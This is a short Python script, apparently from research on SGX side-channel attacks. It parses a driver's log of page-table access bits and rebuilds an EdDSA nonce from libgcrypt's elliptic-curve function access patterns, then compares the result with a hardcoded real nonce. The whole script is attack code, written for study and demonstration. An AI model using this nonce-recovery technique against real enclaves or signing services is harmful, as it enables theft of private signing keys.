#!/usr/bin/python3
from pprint import pprint
import re

INFILE          = 'measurements_raw.txt'
# A(mpi_ec_add_points) && A(mpi_ec_mul_point) && !A(free) && !A(mpi_add)
MPI_TST_PATTERN = '1100'
MPI_ADD_PATTERN = '1001'
NONCE           = '0x4f71d012df3c371af3ea4dc38385ca5bb7272f90cb1b008b3ed601c7'\
                  '6de1d496e30cbf625f0a756a678d8f256d5325595cccc83466f36db18f'\
                  '0178eb9925edd3'

ipis = []
with open(INFILE, 'r') as f:
    for l in f.readlines():
        m = re.search('IPI (\d+) with PTE set 0x([0-9A-Fa-f]+)', l)
        if m:
            ipi_nb = int(m.groups()[0])
            pte_set = int(m.groups()[1], base=16)
            ipis.append((ipi_nb, pte_set))
     
print("gsgx driver recorded (ipi_nb, pte_set):\n")
pprint(ipis)

prev = 0
nonce = []
for (ipi_nb, pte_set) in ipis:
    if prev == int(MPI_TST_PATTERN, base=2):
        nonce.append(pte_set != int(MPI_ADD_PATTERN, base=2))
    prev = pte_set

r = int('0b' + ''.join(['1' if x else '0' for x in nonce]), base=2)
n = int(NONCE, base=16)

print("\nrecovered EdDSA nonce ({0} bits):\n".format(len(nonce)))
print("{0} (recovered)\n{1} (real)".format(hex(r), hex(n)))
print("\n{0} (recovered)\n{1} (real)".format(bin(r), bin(n)))
